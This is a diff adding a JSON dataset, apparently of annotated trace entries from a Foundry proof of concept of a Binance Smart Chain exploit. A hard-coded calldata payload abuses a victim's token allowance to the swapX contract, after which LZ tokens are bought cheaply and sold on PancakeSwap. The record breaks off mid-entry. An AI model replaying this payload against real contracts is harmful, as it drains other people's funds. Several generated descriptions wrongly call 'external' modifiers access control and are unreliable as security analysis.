@@ -1,0 +1,513 @@
+[
+    {
+        "id": "732653",
+        "args": "",
+        "original_code": "    function testExploit() public {\n        console.log(\"Running on BSC at : \", block.number);\n\n        console.log(\"BscexDeployer LZ Balalnce\", LZ.balanceOf(BscexDeployer));\n        console.log(\"LZ allowance to swapXImp\", LZ.allowance(BscexDeployer, swapXImp) / 1e18);\n\n        //  lazy payload check the previous swapX PoC\n        //  swapX.call(abi.encodeWithSelector(0x4f1f05bc, swapPath, transferAmount, value, array, victims[i]));\n        //  calling unverified contract of swapXImp with payload containing swap\n        //  (bool success, bytes memory returndata) = swapXImpl.call{value: msg.value}(data);\n\n        bytes memory payload =\n            hex\"4f1f05bc00000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000082da53fc059357f82f9b400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000dad254728a37d1e80c21afae688c64d0383cc30700000000000000000000000000000000000000000000000000000000000000020000000000000000000000003b78458981eb7260d1f781cb8be2caac7027dbe2000000000000000000000000e9e7cea3dedca5984780bafc599bd69add087d5600000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\";\n        (bool success,) = address(swapXImp).call(payload);\n        console.log(\"Payload delivered\", success);\n\n        console.log(\"BscexDeployer BUSD Balalnce\", BUSD.balanceOf(BscexDeployer) / 1e18);\n\n        // give attacker 50 BUSD\n        deal(address(BUSD), address(this), 50 * 1e18);\n\n        // get BUSD from attacker\n        console.log(\"attacker BUSD Balalnce\", BUSD.balanceOf(address(this)) / 1e18);\n\n        // approve router for 50 BUSD\n        BUSD.approve(address(BISWAPRouter), 50 * 1e18);\n\n        //get amount out for BUSD to LZ\n        // define path\n        address[] memory path = new address[](2);\n        path[0] = address(BUSD);\n        path[1] = address(LZ);\n\n        uint256[] memory amounts = BISWAPRouter.getAmountsOut(50 * 1e18, path);\n        console.log(\"amounts BUSD/LZ\", amounts[0] / 1e18, amounts[1] / 1e18);\n\n        // do the swap\n        BISWAPRouter.swapExactTokensForTokens(amounts[0], amounts[1], path, address(this), block.timestamp);\n\n        // at this point attack has 9_886_999 for 50 BUSD\n        console.log(\"attacker LZ Balalnce\", LZ.balanceOf(address(this)) / 1e18);\n\n        console.log(\"attacker BUSD Balalnce\", BUSD.balanceOf(address(this)) / 1e18);\n\n        // reverse swap on pancake\n        // building a  new path\n        address[] memory path2 = new address[](2);\n        path2[0] = address(LZ);\n        path2[1] = address(BUSD);\n\n        // get amount out for LZ to BUSD from pancackeRouter\n        uint256[] memory amounts2 = pancackeRouter.getAmountsOut(LZ.balanceOf(address(this)), path2);\n\n        console.log(\"amounts LZ/BUSD\", amounts2[0] / 1e18, amounts2[1] / 1e18);\n\n        // attacker gets 88,899 BUSD for 9,886,999 LZ which bought for 50 BUSD\n        // approve pancackeRouter for 9,886,999 LZ\n        LZ.approve(address(pancackeRouter), LZ.balanceOf(address(this)));\n\n        // do the swap\n        pancackeRouter.swapExactTokensForTokens(amounts2[0], amounts2[1], path2, address(this), block.timestamp);\n        // check current BSUSD balance\n        console.log(\"attacker BUSD Balalnce\", BUSD.balanceOf(address(this)) / 1e18);\n    }\n",
+        "description": "1. **Core functions**:  \n   This function is designed to simulate an exploit scenario on the Binance Smart Chain (BSC). It performs a series of actions, including checking balances, sending a payload to a contract, swapping tokens, and reversing the swap. The goal is to manipulate token balances and demonstrate how an attacker could potentially profit from such actions.\n\n2. **Security mechanism**:  \n   The function does not include explicit security mechanisms like access control or input validation. It directly interacts with external contracts and sends a payload without verifying its safety. This lack of security measures makes the function vulnerable to misuse or unintended consequences.\n\n3. **Parameter Function**:  \n   The function does not take any parameters directly. However, it uses predefined variables like `swapXImp`, `BUSD`, `LZ`, `BISWAPRouter`, and `pancackeRouter` to interact with external contracts. These variables represent specific contracts or tokens involved in the exploit simulation.\n\n4. **Return description**:  \n   The function does not return any value. Instead, it logs various outputs to the console, such as token balances, swap amounts, and the success status of the payload delivery. These logs provide insights into the state of the system before and after each operation.\n\n**In summary**, this function simulates an exploit by interacting with external contracts, swapping tokens, and logging the results. It lacks security measures, making it a potential risk if used in a real-world scenario.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "\"Running on BSC at : \", 26024419 [2.602e7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2553",
+        "args": "BscexDeployer: [0xdad254728A37D1E80C21AFae688C64d0383cc307]",
+        "original_code": "  function balanceOf(address account) external view returns (uint256) {\n    return _balances[account];\n  }\n\n",
+        "description": "1. **Core functions**:  \n   This function is designed to check the balance of a specific account. It looks up how many tokens or assets are held by the address provided and returns that amount.\n\n2. **Security mechanism**:  \n   The function uses the `view` modifier, which ensures it only reads data from the blockchain without making any changes. This prevents any unintended modifications to the contract state. Additionally, it is marked as `external`, meaning it can only be called from outside the contract, adding a layer of access control.\n\n3. **Parameter Function**:  \n   The function takes one parameter, `account`, which is an address. This address represents the user or contract whose balance you want to check. It acts as the key to look up the balance in the contract's storage.\n\n4. **Return description**:  \n   The function returns a `uint256` value, which is the balance of the specified account. It retrieves this value directly from the `_balances` mapping, which stores the balances of all accounts in the contract.\n\nIn summary, this function is a simple and secure way to check the balance of a specific account without altering the contract's state.",
+        "return_value": "9886961355188035733617076 [9.886e24]"
+    },
+    {
+        "id": "0",
+        "args": "\"BscexDeployer LZ Balalnce\", 9886961355188035733617076 [9.886e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2639",
+        "args": "BscexDeployer: [0xdad254728A37D1E80C21AFae688C64d0383cc307], 0x6D8981847Eb3cc2234179d0F0e72F6b6b2421a01",
+        "original_code": "  function allowance(address owner, address spender) external view returns (uint256) {\n    return _allowances[owner][spender];\n  }\n\n",
+        "description": "1. **Core functions:**  \n   This function is designed to check how much of a specific token a `spender` is allowed to use on behalf of an `owner`. It essentially looks up and returns the approved amount that the `spender` can transfer from the `owner`'s balance.\n\n2. **Security mechanism:**  \n   The function is marked as `external view`, which means it can only be called from outside the contract and does not modify the contract's state. This ensures that the function is read-only and cannot alter any data, providing a layer of safety against unintended changes.\n\n3. **Parameter Function:**  \n   - `owner`: This is the address of the account that owns the tokens.  \n   - `spender`: This is the address of the account that has been granted permission to spend the owner's tokens.  \n   These parameters are used to look up the specific allowance in the `_allowances` mapping.\n\n4. **Return description:**  \n   The function returns a `uint256` value, which represents the amount of tokens the `spender` is allowed to transfer from the `owner`'s balance. This value is directly fetched from the `_allowances` mapping using the `owner` and `spender` addresses as keys.\n\n**In summary,**  \nThis function is a simple lookup tool to check how much a `spender` can use from an `owner`'s token balance. It is secure because it is read-only and does not modify any data. The parameters specify the `owner` and `spender`, and the return value is the approved amount from the `_allowances` mapping.",
+        "return_value": "999998300000000000000000000 [9.999e26]"
+    },
+    {
+        "id": "0",
+        "args": "\"LZ allowance to swapXImp\", 999998300 [9.999e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "119559",
+        "args": "00000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000082da53fc059357f82f9b400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000dad254728a37d1e80c21afae688c64d0383cc30700000000000000000000000000000000000000000000000000000000000000020000000000000000000000003b78458981eb7260d1f781cb8be2caac7027dbe2000000000000000000000000e9e7cea3dedca5984780bafc599bd69add087d5600000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000060d8692b02a5aaec"
+    },
+    {
+        "id": "2531",
+        "args": "BscexDeployer: [0xdad254728A37D1E80C21AFae688C64d0383cc307]",
+        "original_code": null,
+        "description": null,
+        "return_value": "11518714537487760350735 [1.151e22]"
+    },
+    {
+        "id": "531",
+        "args": "BscexDeployer: [0xdad254728A37D1E80C21AFae688C64d0383cc307]",
+        "original_code": null,
+        "description": null,
+        "return_value": "11518714537487760350735 [1.151e22]"
+    },
+    {
+        "id": "968",
+        "args": "0x858E3312ed3A876947EA49d572A7C42DE08af7EE, LZ: [0x3B78458981eB7260d1f781cb8be2CaAC7027DbE2], BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], 0xfea293c909d87cd4153593f077b76bb7e94340200f4ee84211ae8e4f9bd7ffdf",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000db821bb482cfdae5d3b1a48eead8d2f74678d593"
+    },
+    {
+        "id": "37853",
+        "args": "BscexDeployer: [0xdad254728A37D1E80C21AFae688C64d0383cc307], BISWAP: [0xDb821BB482cfDae5D3B1A48EeaD8d2F74678D593], 9886961355188035733617076 [9.886e24]",
+        "original_code": "  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {\n    _transfer(sender, recipient, amount);\n    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"BEP20: transfer amount exceeds allowance\"));\n    return true;\n  }\n\n",
+        "description": "1. **Core function**:  \n   The `transferFrom` function is designed to move a specified amount of tokens from one account (`sender`) to another (`recipient`). It is commonly used when a third party (like a smart contract or another user) is authorized to transfer tokens on behalf of the sender. The function ensures the transfer is executed and updates the allowance (the approved amount the sender has allowed the caller to spend).\n\n2. **Security mechanism**:  \n   - The function is marked as `external`, meaning it can only be called from outside the contract, ensuring internal logic is protected.  \n   - It uses `_transfer` to handle the actual token movement, which likely includes checks to prevent invalid transfers.  \n   - The `_approve` function is called to reduce the sender's allowance for the caller, ensuring the transferred amount is deducted from the approved limit.  \n   - The `sub` function (likely from a safe math library) is used to subtract the transferred amount from the allowance, preventing underflow errors and ensuring the transfer does not exceed the approved limit.  \n\n3. **Parameter Function**:  \n   - `sender`: The address of the account from which tokens are being transferred.  \n   - `recipient`: The address of the account receiving the tokens.  \n   - `amount`: The number of tokens to be transferred.  \n\n4. **Return description**:  \n   The function returns `true` to indicate that the transfer was successful. This is a standard practice in token contracts to confirm the operation completed without errors.  \n\n**In summary**, the `transferFrom` function securely transfers tokens from one account to another while ensuring the caller is authorized to spend the specified amount. It updates the allowance and confirms the success of the transfer by returning `true`.",
+        "return_value": "true"
+    },
+    {
+        "id": "2459",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000026db9e5f974ec3fc700000000000000000000000000000000000000000000000060d885fc15ea60ef0000000000000000000000000000000000000000000000000000000063fb37e9"
+    },
+    {
+        "id": "2380",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000002"
+    },
+    {
+        "id": "553",
+        "args": "BISWAP: [0xDb821BB482cfDae5D3B1A48EeaD8d2F74678D593]",
+        "original_code": null,
+        "description": null,
+        "return_value": "9887006155279663549593979 [9.887e24]"
+    },
+    {
+        "id": "43410",
+        "args": "0, 6978443256059505388 [6.978e18], BscexDeployer: [0xdad254728A37D1E80C21AFae688C64d0383cc307], 0x",
+        "original_code": "    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {\n        require(amount0Out > 0 || amount1Out > 0, 'Biswap: INSUFFICIENT_OUTPUT_AMOUNT');\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        require(amount0Out < _reserve0 && amount1Out < _reserve1, 'Biswap: INSUFFICIENT_LIQUIDITY');\n\n        uint balance0;\n        uint balance1;\n        { // scope for _token{0,1}, avoids stack too deep errors\n        address _token0 = token0;\n        address _token1 = token1;\n        require(to != _token0 && to != _token1, 'Biswap: INVALID_TO');\n        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n        if (data.length > 0) IBiswapCallee(to).BiswapCall(msg.sender, amount0Out, amount1Out, data);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\n        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\n        require(amount0In > 0 || amount1In > 0, 'Biswap: INSUFFICIENT_INPUT_AMOUNT');\n        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n        uint _swapFee = swapFee;\n        uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(_swapFee));\n        uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(_swapFee));\n        require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'Biswap: K');\n        }\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    }\n\n    // force balances to match reserves\n",
+        "description": "1. **Core functions**:  \n   This function is designed to facilitate a token swap between two different tokens in a decentralized exchange. It allows users to exchange one token for another by specifying the amounts they want to receive (`amount0Out` and `amount1Out`). The function ensures that the swap is executed correctly by checking the available reserves of the tokens, transferring the tokens to the recipient, and updating the reserves after the swap. It also supports additional functionality through a callback mechanism if the recipient is a smart contract.\n\n2. **Security mechanism**:  \n   - **`lock` modifier**: Prevents reentrancy attacks by ensuring the function cannot be called again before the current execution completes.  \n   - **`require` statements**: These checks ensure that the swap is valid by verifying that the output amounts are greater than zero, the requested amounts do not exceed the available reserves, and the recipient address is not one of the token addresses.  \n   - **`_safeTransfer`**: Safely transfers tokens to the recipient, ensuring the transfer is successful.  \n   - **Reserve and balance checks**: Ensures the swap does not deplete the reserves and maintains the integrity of the exchange.  \n   - **Fee adjustment**: Adjusts the balances by deducting the swap fee and ensures the product of the adjusted balances meets the required condition (`K` value) to maintain liquidity.  \n\n3. **Parameter Function**:  \n   - **`amount0Out` and `amount1Out`**: These specify the amounts of the two tokens the user wants to receive from the swap.  \n   - **`to`**: The address of the recipient who will receive the swapped tokens.  \n   - **`data`**: Optional data that can be passed to the recipient if it is a smart contract, enabling additional functionality through a callback.  \n\n4. **Return description**:  \n   The function does not return a value directly. Instead, it performs the following calculations and actions:  \n   - It calculates the input amounts (`amount0In` and `amount1In`) based on the difference between the current balances and the adjusted reserves.  \n   - It adjusts the balances by deducting the swap fee and ensures the product of the adjusted balances meets the required condition (`K` value) to maintain liquidity.  \n   - It updates the reserves with the new balances and emits a `Swap` event to log the details of the transaction.  \n\nIn summary, this function enables secure and efficient token swaps in a decentralized exchange by ensuring the swap is valid, transferring tokens safely, and maintaining the integrity of the reserves. It includes multiple security checks and supports additional functionality through a callback mechanism.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "10871",
+        "args": "BscexDeployer: [0xdad254728A37D1E80C21AFae688C64d0383cc307], 6978443256059505388 [6.978e18]",
+        "original_code": "  function transfer(address recipient, uint256 amount) external returns (bool) {\n    _transfer(_msgSender(), recipient, amount);\n    return true;\n  }\n\n",
+        "description": "1. **Core functions**:  \n   The `transfer` function is designed to move a specified amount of tokens from the caller's account to another account (recipient). It acts as a bridge to facilitate the transfer of tokens between two parties in a secure and straightforward manner.\n\n2. **Security mechanism**:  \n   - The `external` modifier ensures that this function can only be called from outside the contract, preventing internal misuse.  \n   - The `_transfer` function (called internally) likely includes additional checks to ensure the transfer is valid, such as verifying the sender has enough tokens and that the recipient address is valid.  \n   - The use of `_msgSender()` ensures the correct sender address is used, which is important for security in contracts that support meta-transactions or proxies.  \n\n3. **Parameter Function**:  \n   - `recipient`: This is the address of the account that will receive the tokens. It must be a valid Ethereum address.  \n   - `amount`: This specifies the number of tokens to be transferred. It must be a positive value and should not exceed the sender's balance.  \n\n4. **Return description**:  \n   The function returns a boolean value (`true`) to indicate that the transfer was successful. This is a standard practice to confirm the operation completed as expected.  \n\n**In summary**, the `transfer` function securely moves tokens from the caller to a recipient, ensuring proper validation and returning a success confirmation.",
+        "return_value": "true"
+    },
+    {
+        "id": "553",
+        "args": "BISWAP: [0xDb821BB482cfDae5D3B1A48EeaD8d2F74678D593]",
+        "original_code": null,
+        "description": null,
+        "return_value": "9887006155279663549593979 [9.887e24]"
+    },
+    {
+        "id": "531",
+        "args": "BISWAP: [0xDb821BB482cfDae5D3B1A48EeaD8d2F74678D593]",
+        "original_code": null,
+        "description": null,
+        "return_value": "31684297012739 [3.168e13]"
+    },
+    {
+        "id": "531",
+        "args": "BscexDeployer: [0xdad254728A37D1E80C21AFae688C64d0383cc307]",
+        "original_code": null,
+        "description": null,
+        "return_value": "11525692980743819856123 [1.152e22]"
+    },
+    {
+        "id": "531",
+        "args": "BscexDeployer: [0xdad254728A37D1E80C21AFae688C64d0383cc307]",
+        "original_code": null,
+        "description": null,
+        "return_value": "11525692980743819856123 [1.152e22]"
+    },
+    {
+        "id": "0",
+        "args": "\"Payload delivered\", true",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "531",
+        "args": "BscexDeployer: [0xdad254728A37D1E80C21AFae688C64d0383cc307]",
+        "original_code": null,
+        "description": null,
+        "return_value": "11525692980743819856123 [1.152e22]"
+    },
+    {
+        "id": "0",
+        "args": "\"BscexDeployer BUSD Balalnce\", 11525 [1.152e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2531",
+        "args": "thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "0",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "531",
+        "args": "thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "0",
+        "args": "BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56]",
+        "original_code": null,
+        "description": null,
+        "return_value": "[0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96], []"
+    },
+    {
+        "id": "0",
+        "args": "BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "0",
+        "args": "BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "531",
+        "args": "thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "0",
+        "args": "BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "531",
+        "args": "thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]"
+    },
+    {
+        "id": "0",
+        "args": "BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96, 0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "0",
+        "args": "BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96, 0x000000000000000000000000000000000000000000000002b5e3af16b1880000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "531",
+        "args": "thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "50000000000000000000 [5e19]"
+    },
+    {
+        "id": "531",
+        "args": "thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "50000000000000000000 [5e19]"
+    },
+    {
+        "id": "0",
+        "args": "\"attacker BUSD Balalnce\", 50",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "24562",
+        "args": "BISWAP Router: [0x3a6d8cA21D1CF76F653A67577FA0D27453350dD8], 50000000000000000000 [5e19]",
+        "original_code": "  function approve(address spender, uint256 amount) external returns (bool) {\n    _approve(_msgSender(), spender, amount);\n    return true;\n  }\n\n",
+        "description": "1. **Core functions:**  \n   The `approve` function is used to allow another address (called the `spender`) to spend a specified amount of tokens on behalf of the caller. This is a common function in token contracts, enabling delegated spending without transferring ownership of the tokens.\n\n2. **Security mechanism:**  \n   - The function uses the `external` modifier, meaning it can only be called from outside the contract, ensuring internal state changes are controlled.  \n   - It relies on the `_msgSender()` function to securely identify the caller, preventing potential impersonation attacks.  \n   - The actual approval logic is handled by the internal `_approve` function, which likely includes additional checks to ensure the operation is valid.  \n\n3. **Parameter Function:**  \n   - `spender`: This is the address that is being granted permission to spend tokens.  \n   - `amount`: This specifies the maximum number of tokens the `spender` is allowed to use.  \n\n4. **Return description:**  \n   The function always returns `true` to indicate that the approval operation was successful. This is a standard practice in ERC-20 token contracts to confirm the action was completed.  \n\n**In summary,**  \nThe `approve` function allows a token holder to authorize another address to spend a specific amount of tokens on their behalf. It uses secure mechanisms to ensure the caller is verified and the operation is valid, and it returns `true` to confirm success.",
+        "return_value": "true"
+    },
+    {
+        "id": "5704",
+        "args": "50000000000000000000 [5e19], [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56, 0x3B78458981eB7260d1f781cb8be2CaAC7027DbE2]",
+        "original_code": "    function getAmountsOut(address factory, uint amountIn, address[] memory path) internal view returns (uint[] memory amounts) {\n        require(path.length >= 2, 'BiswapLibrary: INVALID_PATH');\n        amounts = new uint[](path.length);\n        amounts[0] = amountIn;\n        for (uint i; i < path.length - 1; i++) {\n            (uint reserveIn, uint reserveOut) = getReserves(factory, path[i], path[i + 1]);\n            amounts[i + 1] = getAmountOut(amounts[i], reserveIn, reserveOut, getSwapFee(factory, path[i], path[i + 1]));\n        }\n    }\n\n    // performs chained getAmountIn calculations on any number of pairs\n",
+        "description": "1. Core functions:  \nThe `getAmountsOut` function calculates the expected output amounts for a series of token swaps along a specified path. It starts with a given input amount and iteratively computes the output amount for each pair of tokens in the path. This is useful for determining how much of the final token you will receive after a series of swaps.\n\n2. Security mechanism:  \nThe function includes a `require` statement to ensure the path has at least two tokens, preventing invalid or incomplete paths. It also uses the `view` modifier, which means it does not modify the blockchain state and only reads data. Additionally, it relies on internal helper functions (`getReserves`, `getAmountOut`, and `getSwapFee`) to fetch and compute necessary data securely.\n\n3. Parameter Function:  \n- `factory`: The address of the factory contract that holds information about token pairs.  \n- `amountIn`: The initial amount of the first token in the path that you want to swap.  \n- `path`: An array of token addresses representing the sequence of swaps. For example, swapping Token A to Token B to Token C.  \n\n4. Return description:  \nThe function returns an array of amounts (`amounts`). The first element is the input amount (`amountIn`), and each subsequent element is the calculated output amount after swapping through the corresponding token pair in the path. The calculation uses the reserves of the token pairs and the swap fee to determine the output amounts.\n\nIn summary,  \nThe `getAmountsOut` function calculates the expected output amounts for a series of token swaps along a specified path. It ensures the path is valid, uses secure helper functions, and returns an array of amounts representing the output at each step of the swap sequence.",
+        "return_value": "[50000000000000000000 [5e19], 9886999877471233034310454 [9.886e24]]"
+    },
+    {
+        "id": "459",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000082da7ad7a3f2ef46f397b00000000000000000000000000000000000000000000000000001cd11344b6030000000000000000000000000000000000000000000000000000000063fc5c94"
+    },
+    {
+        "id": "380",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000002"
+    },
+    {
+        "id": "0",
+        "args": "\"amounts BUSD/LZ\", 50, 9886999 [9.886e6]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "115208",
+        "args": "50000000000000000000 [5e19], 9886999877471233034310454 [9.886e24], [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56, 0x3B78458981eB7260d1f781cb8be2CaAC7027DbE2], thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1677483156 [1.677e9]",
+        "original_code": "    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n",
+        "description": "1. **Core functions:**  \n   The `swapExactTokensForTokens` function is designed to allow users to exchange a specific amount of one token for another token through a series of token swaps. It follows a predefined path of token addresses to complete the exchange. The function ensures that the user receives at least a minimum amount of the desired token in return for the tokens they provide.\n\n2. **Security mechanism:**  \n   - `external`: This modifier ensures the function can only be called from outside the contract, preventing internal misuse.  \n   - `deadline`: This parameter acts as a time limit for the transaction. If the transaction is not completed before the deadline, it will fail, preventing outdated or delayed transactions.  \n   - `amountOutMin`: This ensures the user receives a minimum amount of the desired token, protecting them from unfavorable exchange rates or slippage.  \n\n3. **Parameter Function:**  \n   - `amountIn`: The exact amount of the initial token the user wants to swap.  \n   - `amountOutMin`: The minimum amount of the final token the user expects to receive.  \n   - `path`: An array of token addresses that defines the sequence of swaps to reach the desired token.  \n   - `to`: The address where the final tokens will be sent.  \n   - `deadline`: The latest time (in Unix timestamp) by which the transaction must be completed.  \n\n4. **Return description:**  \n   The function returns an array of amounts representing the output tokens at each step of the swap path. The final amount in the array is the total amount of the desired token the user receives. This array helps track the exact amounts exchanged at each stage of the swap process.  \n\n**In summary,**  \nThe `swapExactTokensForTokens` function enables users to swap tokens along a predefined path while ensuring they receive a minimum amount of the desired token. It includes safeguards like a deadline and minimum output amount to protect users from unfavorable conditions. The function returns an array detailing the amounts exchanged at each step of the swap.",
+        "return_value": "[50000000000000000000 [5e19], 9886999877471233034310454 [9.886e24]]"
+    },
+    {
+        "id": "459",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000082da7ad7a3f2ef46f397b00000000000000000000000000000000000000000000000000001cd11344b6030000000000000000000000000000000000000000000000000000000063fc5c94"
+    },
+    {
+        "id": "380",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000002"
+    },
+    {
+        "id": "6034",
+        "args": "thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], BISWAP: [0xDb821BB482cfDae5D3B1A48EeaD8d2F74678D593], 50000000000000000000 [5e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18898",
+        "args": "thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], LZ: [0x3B78458981eB7260d1f781cb8be2CaAC7027DbE2], 9886999877471233034310454 [9.886e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "11564",
+        "args": "thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], BUSD: [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56], LZ: [0x3B78458981eB7260d1f781cb8be2CaAC7027DbE2], 9886999877471233034310454 [9.886e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "2536",
+        "args": "thisContract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
